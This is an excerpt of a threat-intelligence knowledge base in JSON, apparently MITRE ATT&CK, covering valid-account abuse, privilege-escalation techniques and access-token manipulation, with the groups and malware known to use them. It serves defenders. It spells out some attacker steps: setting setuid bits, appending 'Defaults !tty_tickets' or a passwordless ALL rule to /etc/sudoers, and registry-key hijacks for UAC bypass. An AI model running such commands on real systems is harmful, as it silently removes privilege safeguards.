{"id": "G1023", "name": "APT5", "description": "APT5 has used legitimate account credentials to move laterally through compromised environments."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used multiple mechanisms to capture valid user accounts for victim domains to enable lateral movement and access to additional hosts in victim environments."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used compromised domain accounts to gain access to the target environment."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has obtained highly privileged credentials such as domain administrator in order to deploy malware."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use known credentials to run commands and spawn processes as a domain user account."}, {"id": "S1024", "name": "CreepySnail", "description": "CreepySnail can use stolen credentials to authenticate on target networks."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used compromised VPN accounts for lateral movement on targeted networks."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has collected credentials from infected systems, including domain accounts."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used domain administrator accounts after dumping LSASS process memory."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used administrator credentials for lateral movement in compromised networks."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used domain accounts to gain further access to victim systems."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used compromised domain administrator credentials as part of their lateral movement."}, {"id": "C0023", "name": "Operation Ghost", "description": "For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used domain credentials, including domain admin, for lateral movement and privilege escalation."}, {"id": "G1040", "name": "Play", "description": "Play has used valid domain accounts for access."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk can use stolen domain admin accounts to move laterally within a victim domain."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used stolen credentials to access administrative accounts within the domain."}, {"id": "S0140", "name": "Shamoon", "description": "If Shamoon cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet attempts to access network resources with a domain account\u2019s credentials."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used stolen domain admin accounts to compromise additional hosts."}, {"id": "G0028", "name": "Threat Group-1314", "description": "Threat Group-1314 actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used compromised domain admin credentials to mount local network shares."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used compromised domain accounts to authenticate to devices on compromised networks."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network."}]}, {"name": "Local Accounts", "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.", "detailed_description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.", "id": "T1078.003", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used legitimate local admin account credentials."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use known credentials to run commands and spawn processes as a local user account."}, {"id": "S0367", "name": "Emotet", "description": "Emotet can brute force a local admin password, then use it to facilitate lateral movement."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has moved laterally using the Local Administrator account."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used compromised credentials for access as SYSTEM on Exchange servers."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya can use valid credentials with PsExec or wmic to spread itself to remote systems."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation."}, {"id": "G1040", "name": "Play", "description": "Play has used valid  local accounts to gain initial access."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has created admin accounts on a compromised host."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used known administrator account credentials to execute the backdoor directly."}, {"id": "G0010", "name": "Turla", "description": "Turla has abused local accounts that have the same password across the victim\u2019s network."}, {"id": "S0221", "name": "Umbreon", "description": "Umbreon creates valid local users to provide access to the system."}]}, {"name": "Cloud Accounts", "description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. ", "detailed_description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication.\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods.", "id": "T1078.004", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes."}, {"id": "G0016", "name": "APT29", "description": "APT29 has gained access to a global administrator account in Azure AD and has used Service Principal credentials in Exchange."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints."}, {"id": "G1023", "name": "APT5", "description": "APT5 has accessed Microsoft M365 cloud environments using stolen credentials. "}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider leveraged compromised credentials from victim users  to authenticate to Azure tenants."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used compromised credentials to sign into victims\u2019 Microsoft 365 accounts."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used compromised credentials to access cloud assets within a target organization."}, {"id": "S1091", "name": "Pacu", "description": "Pacu leverages valid cloud accounts to perform most of its operations."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can use stolen service account tokens to perform its operations."}, {"id": "S0684", "name": "ROADTools", "description": "ROADTools leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal."}]}]}]}, {"name": "Privilege Escalation", "description": "The adversary is trying to gain higher-level permissions.Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: SYSTEM/root levellocal administratoruser account with admin-like access user accounts with access to specific system or perform specific functionThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.", "id": "TA0004", "techniques": [{"name": "Abuse Elevation Control Mechanism", "description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.", "detailed_description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.", "id": "T1548", "examples": [{"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin implements a variation of the ucmDccwCOMMethod technique abusing the Windows AutoElevate backdoor to bypass UAC while elevating privileges."}], "sub_techniques": [{"name": "Setuid and Setgid", "description": "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user\u2019s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.", "detailed_description": "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user\u2019s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. Linux and Mac File and Directory Permissions Modification). The chmod command can set these bits with bitmasking, chmod 4777 [file] or via shorthand naming, chmod u+s [file]. This will enable the setuid bit. To enable the setgid bit, chmod 2775 and chmod g+s can be used.\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future. This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. File and Directory Discovery). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via ls -l. The find command can also be used to search for such files. For example, find / -perm +4000 2>/dev/null can be used to find files with setuid set and find / -perm +2000 2>/dev/null may be used for setgid. Binaries that have these bits set may then be abused by adversaries.", "id": "T1548.001", "examples": [{"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux can execute commands with high privileges via a specific binary with setuid functionality."}, {"id": "S0276", "name": "Keydnap", "description": "Keydnap adds the setuid flag to a binary so it can easily elevate in the future."}]}, {"name": "Bypass User Account Control", "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.", "detailed_description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.", "id": "T1548.002", "examples": [{"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has presented the user with a UAC prompt to elevate privileges while installing."}, {"id": "G0016", "name": "APT29", "description": "APT29 has bypassed UAC."}, {"id": "G0067", "name": "APT37", "description": "APT37 has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges."}, {"id": "S0129", "name": "AutoIt backdoor", "description": "AutoIt backdoor attempts to escalate privileges by bypassing User Access Control."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon bypasses UAC using the CMSTPLUA COM interface."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit has attempted to bypass UAC and gain elevated administrative privileges."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can utilize the CMSTPLUA COM interface and the SilentCleanup task to bypass UAC."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can suppress UAC prompts by setting the HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command registry key on Windows 10 or HKCU\\Software\\Classes\\mscfile\\shell\\open\\command on Windows 7 and launching the eventvwr.msc process, which launches BitPaymer with elevated privileges."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can bypass UAC to escalate privileges."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has the ability to bypass UAC to deploy post exploitation tools with elevated privileges."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can make use of the Windows SilentCleanup scheduled task to execute its payload with elevated privileges."}, {"id": "S0660", "name": "Clambling", "description": "Clambling has the ability to bypass UAC using a passuac.dll file."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has bypassed UAC."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use a number of known techniques to bypass Windows UAC."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader can bypass UAC using the SilentCleanup task to execute the binary with elevated privileges."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate uses two distinct User Account Control (UAC) bypass techniques to escalate privileges."}, {"id": "S0134", "name": "Downdelph", "description": "Downdelph bypasses UAC to escalate privileges by using a custom \"RedirectEXE\" shim database."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used the Fodhelper UAC bypass technique to gain elevated privileges."}, {"id": "S0363", "name": "Empire", "description": "Empire includes various modules to attempt to bypass UAC for escalation of privileges."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum has used PowerShell to bypass UAC."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher performs UAC bypass."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can bypass UAC to elevate process privileges on a compromised host."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can bypass UAC by registering as the default handler for .MSC files."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe)."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can use fileless UAC bypass and create an elevated COM object to escalate privileges."}, {"id": "S0250", "name": "Koadic", "description": "Koadic has 2 methods for elevating integrity. It can bypass UAC through eventvwr.exe and sdclt.exe."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS will perform UAC bypass either through fodhelper.exe or eventvwr.exe."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has bypassed UAC by performing token impersonation as well as an RPC-based method, this included bypassing UAC set to \"AlwaysNotify\"."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has utilized multiple techniques to bypass UAC."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater uses various techniques to bypass UAC."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors used the malicious NTWDBLIB.DLL and cliconfig.exe to bypass UAC protections."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork bypassed User Access Control (UAC)."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon installer can use UAC bypass techniques to install the payload."}, {"id": "S0254", "name": "PLAINTEE", "description": "An older variant of PLAINTEE performs UAC bypass."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can utilize multiple methods to bypass UAC."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can generate a UAC pop-up Window to prompt the target user to run a command as the administrator."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can use UACMe for privilege escalation."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will use the legitimate Windows utility fodhelper.exe to run processes at elevated privileges without requiring a User Account Control prompt."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can bypass UAC to escalate privileges."}, {"id": "S0332", "name": "Remcos", "description": "Remcos has a command for UAC bypassing."}, {"id": "S0148", "name": "RTM", "description": "RTM can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has attempted to bypass UAC using fodhelper.exe to escalate privileges."}, {"id": "S0074", "name": "Sakula", "description": "Sakula contains UAC bypass code for both 32- and 64-bit systems."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon attempts to disable UAC remote restrictions by modifying the Registry."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY contains a number of modules that can bypass UAC, including through Window's Device Manager, Manage Optional Features, and an image hijack on the .msc file extension."}, {"id": "G0027", "name": "Threat Group-3390", "description": "A Threat Group-3390 tool can use a public UAC bypass method to elevate privileges."}, {"id": "S0116", "name": "UACMe", "description": "UACMe contains many methods for bypassing Windows User Account Control on multiple versions of the operating system."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can use sdclt.exe to bypass UAC in Windows 10 to escalate privileges; for older Windows versions WarzoneRAT can use the IFileOperation exploit to bypass the UAC module."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker can perform a UAC bypass if it is not executed with administrator rights or if the infected host runs Windows Vista or later."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can use a variant of the sysprep UAC bypass."}, {"id": "S0230", "name": "ZeroT", "description": "Many ZeroT samples can perform UAC bypass by using eventvwr.exe to execute a malicious file."}]}, {"name": "Sudo and Sudo Caching", "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.", "detailed_description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The sudo command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\nThe sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL. Elevated privileges are required to edit this file though.\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user.\nIn the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \\'Defaults !tty_tickets\\' >> /etc/sudoers. In order for this change to be reflected, the malware also issued killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.", "id": "T1548.003", "examples": [{"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use sudo to run a command."}, {"id": "S0281", "name": "Dok", "description": "Dok adds admin  ALL=(ALL) NOPASSWD: ALL to the /etc/sudoers file."}, {"id": "S0279", "name": "Proton", "description": "Proton modifies the tty_tickets line in the sudoers file."}]}, {"name": "Elevated Execution with Prompt", "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.", "detailed_description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.\nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\nAdversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms. This technique may be combined with Masquerading to trick the user into granting escalated privileges to malicious code. This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.", "id": "T1548.004", "examples": [{"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer can escalate privileges to root by asking the user for credentials."}]}, {"name": "Temporary Elevated Cloud Access", "description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own.", "detailed_description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own.\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the iam.serviceAccountTokenCreator role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts. In Exchange Online, the ApplicationImpersonation role allows a service account to use the permissions associated with specified user accounts.\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the PassRole permission can allow a service they create to assume a given role, while in GCP, users with the iam.serviceAccountUser role can attach a service account to a resource.\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.\nNote: this technique is distinct from Additional Cloud Roles, which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control Additional Cloud Roles that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.", "id": "T1548.005", "examples": []}, {"name": "TCC Manipulation", "description": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).", "detailed_description": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).\nWhen an application requests to access data or a service protected by TCC, the TCC daemon (tccd) checks the TCC database, located at /Library/Application Support/com.apple.TCC/TCC.db (and ~/ equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.\nAdversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through Process Injection or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious AppleScript. When executing under the Finder App, the malicious AppleScript inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and Launchctl.", "id": "T1548.006", "examples": []}]}, {"name": "Access Token Manipulation", "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.", "detailed_description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\nAny standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.", "id": "T1134", "examples": [{"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can gain system level privilege by passing SeDebugPrivilege to the AdjustTokenPrivilege API."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat has the ability modify access tokens."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used JuicyPotato to abuse the SeImpersonate token privilege to escalate from web application pool accounts to NT Authority\\SYSTEM."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY\\SYSTEM privilege escalation."}, {"id": "S0625", "name": "Cuba", "description": "Cuba has used SeDebugPrivilege and AdjustTokenPrivileges to elevate privileges."}, {"id": "S0038", "name": "Duqu", "description": "Duqu examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges."}, {"id": "S0363", "name": "Empire", "description": "Empire can use PowerSploit's Invoke-TokenManipulation to manipulate access tokens."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used has used Metasploit\u2019s named-pipe impersonation technique to escalate privileges."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can use token manipulation to bypass UAC on Windows7 systems."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can use AdjustTokenPrivileges to grant itself privileges for debugging with SeDebugPrivilege, creating backups with SeBackupPrivilege, loading drivers with SeLoadDriverPrivilege, and shutting down a local system with SeShutdownPrivilege."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can adjust token privileges."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk has attempted to get the access token of a process by calling OpenProcessToken. If KillDisk gets the access token, then it attempt to modify the token privileges with AdjustTokenPrivileges."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can use AdjustTokenPrivileges() to elevate privileges."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex can enable SeDebugPrivilege and adjust token privileges."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can use Invoke-TokenManipulation for manipulating tokens."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Invoke-TokenManipulation Exfiltration module can be used to manipulate tokens."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has attempted to adjust its token privileges to have the SeDebugPrivilege."}, {"id": "S0633", "name": "Sliver", "description": "Sliver has the ability to manipulate user 